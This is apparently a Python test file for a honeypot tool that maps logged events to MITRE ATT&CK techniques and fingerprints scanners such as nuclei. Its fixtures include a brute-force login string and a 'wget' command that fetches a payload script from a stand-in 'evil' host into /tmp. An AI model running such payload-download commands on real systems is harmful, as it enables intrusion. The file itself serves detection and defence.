"""Tests for ATT&CK technique detection and tool fingerprinting."""

from __future__ import annotations

from canary.attack.matrix import tactic_label, technique_info
from canary.attack.rules import detect_techniques
from canary.core.models import NormalizedEvent
from canary.correlate.fingerprint import fingerprint, fingerprint_event


def _event(**kw) -> NormalizedEvent:
    base = {"honeypot": "test", "event_type": "generic"}
    base.update(kw)
    return NormalizedEvent(**base)


class TestDetectTechniques:
    def test_brute_force(self) -> None:
        t, tactic, conf = detect_techniques(
            _event(command="cat", raw="login attempt root:admin123")
        )
        assert t == "T1110"
        assert tactic == "credential-access"
        assert conf > 0

    def test_command_interpreter(self) -> None:
        t, _, _ = detect_techniques(_event(command="bash -c 'id'"))
        assert t == "T1059"

    def test_ingress_tool_transfer(self) -> None:
        t, _, _ = detect_techniques(_event(command="wget http://evil/payload.sh -O /tmp/x.sh"))
        assert t in ("T1105", "T1204")

    def test_nothing_matches(self) -> None:
        t, tactic, conf = detect_techniques(_event(command="echo hello"))
        assert t is None
        assert tactic is None
        assert conf == 0.0


class TestFingerprint:
    def test_nuclei_ua(self) -> None:
        event = _event(user_agent="nuclei v3.2.0", raw="GET /wp-login")
        assert fingerprint_event(event) == "nuclei"

    def test_python_requests_ua(self) -> None:
        event = _event(user_agent="python-requests/2.31")
        assert fingerprint_event(event) == "python-requests"

    def test_generic_text_no_tool(self) -> None:
        assert fingerprint("ls -la") is None


class TestMatrix:
    def test_technique_info(self) -> None:
        info = technique_info("T1110")
        assert info is not None
        assert info["name"] == "Brute Force"
        assert info["tactic"] == "credential-access"

    def test_tactic_label(self) -> None:
        assert tactic_label("credential-access") == "Credential Access"
        assert tactic_label(None) == "Unknown"
